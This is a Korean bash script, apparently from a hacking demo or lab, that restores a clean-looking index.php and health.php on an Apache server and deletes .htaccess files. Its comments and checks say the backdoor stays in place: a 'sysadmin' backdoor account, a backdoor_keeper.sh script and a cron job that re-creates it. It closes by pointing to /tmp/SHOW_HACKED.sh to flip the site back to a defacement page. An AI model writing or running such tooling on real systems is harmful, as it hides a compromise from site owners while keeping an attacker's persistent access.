#!/bin/bash
###############################################################################
# 데모용 웹사이트 복구 스크립트
# - 백도어는 그대로 유지
# - 웹사이트만 정상으로 복구
# - 나중에 언제든지 해킹 페이지로 전환 가능
###############################################################################

echo "╔═══════════════════════════════════════════════╗"
echo "║   데모용 웹사이트 복구                       ║"
echo "║   (백도어는 유지됨)                          ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""

# Root 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo "❌ Root 권한이 필요합니다. sudo를 사용하세요."
    exit 1
fi

# 1. 정상 웹사이트 복구
echo "[1/3] 정상 웹사이트로 복구 중..."

# 정상 index.php
cat > /var/www/html/www/index.php << 'EOFINDEX'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Our Service</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            padding: 3rem;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 600px;
            width: 90%;
            text-align: center;
        }
        h1 {
            color: #667eea;
            margin-bottom: 1rem;
            font-size: 2.5rem;
        }
        .subtitle {
            color: #666;
            margin-bottom: 2rem;
            font-size: 1.1rem;
        }
        .features {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            margin: 2rem 0;
        }
        .feature {
            background: #f8f9fa;
            padding: 1.5rem;
            border-radius: 10px;
            transition: transform 0.3s;
        }
        .feature:hover {
            transform: translateY(-5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .feature-icon {
            font-size: 2rem;
            margin-bottom: 0.5rem;
        }
        .feature-title {
            font-weight: bold;
            color: #333;
            margin-bottom: 0.5rem;
        }
        .links {
            display: flex;
            gap: 1rem;
            justify-content: center;
            margin-top: 2rem;
        }
        a {
            display: inline-block;
            padding: 1rem 2rem;
            background: #667eea;
            color: white;
            text-decoration: none;
            border-radius: 8px;
            transition: all 0.3s;
            font-weight: 500;
        }
        a:hover {
            background: #764ba2;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        .status {
            margin-top: 2rem;
            padding: 1rem;
            background: #d4edda;
            border-radius: 8px;
            color: #155724;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🌟 Welcome</h1>
        <p class="subtitle">안전하고 신뢰할 수 있는 서비스</p>

        <div class="features">
            <div class="feature">
                <div class="feature-icon">🔒</div>
                <div class="feature-title">보안</div>
                <div>최신 보안 기술</div>
            </div>
            <div class="feature">
                <div class="feature-icon">⚡</div>
                <div class="feature-title">빠른 속도</div>
                <div>최적화된 성능</div>
            </div>
            <div class="feature">
                <div class="feature-icon">💾</div>
                <div class="feature-title">안정성</div>
                <div>99.9% 가동률</div>
            </div>
            <div class="feature">
                <div class="feature-icon">🌐</div>
                <div class="feature-title">글로벌</div>
                <div>전세계 서비스</div>
            </div>
        </div>

        <div class="status">
            ✅ 모든 시스템 정상 작동 중
        </div>

        <div class="links">
            <a href="/login.php">로그인</a>
            <a href="/upload.php">파일 업로드</a>
        </div>
    </div>
</body>
</html>
EOFINDEX

# 안전한 health.php
cat > /var/www/html/www/api/health.php << 'EOFHEALTH'
<?php
header('Content-Type: application/json');
echo json_encode([
    'status' => 'OK',
    'timestamp' => time(),
    'version' => '1.0.0',
    'uptime' => exec('uptime -p')
]);
?>
EOFHEALTH

# .htaccess 제거 (있다면)
find /var/www/html/www -name ".htaccess" -delete

# 권한 설정
chown -R apache:apache /var/www/html/www
chmod 644 /var/www/html/www/index.php
chmod 644 /var/www/html/www/api/health.php

echo "  ✅ 정상 웹사이트 복구 완료"
echo ""

# 2. Apache 재시작
echo "[2/3] Apache 재시작 중..."
apachectl configtest 2>&1 | grep -q "Syntax OK" && echo "  - Apache 설정 정상"
systemctl restart httpd && echo "  ✅ Apache 재시작 완료"
echo ""

# 3. 백도어 유지 확인
echo "[3/3] 백도어 상태 확인..."
if id sysadmin &>/dev/null; then
    echo "  ✅ 백도어 사용자 (sysadmin) 유지됨"
else
    echo "  ⚠️  백도어 사용자 없음 (재생성 필요시 cron이 복구)"
fi

if [ -f /usr/local/bin/backdoor_keeper.sh ]; then
    echo "  ✅ 백도어 유지 스크립트 존재"
else
    echo "  ⚠️  백도어 유지 스크립트 없음"
fi

if crontab -l 2>/dev/null | grep -q backdoor_keeper; then
    echo "  ✅ Cron 작업 유지됨 (자동 복구 활성)"
else
    echo "  ⚠️  Cron 작업 없음"
fi

echo ""
echo "╔═══════════════════════════════════════════════╗"
echo "║   ✅ 데모용 복구 완료!                       ║"
echo "║                                              ║"
echo "║   웹사이트: 정상 표시                        ║"
echo "║   백도어: 유지됨                             ║"
echo "║                                              ║"
echo "║   해킹 페이지로 전환:                        ║"
echo "║   sudo bash /tmp/SHOW_HACKED.sh              ║"
echo "╚═══════════════════════════════════════════════╝"
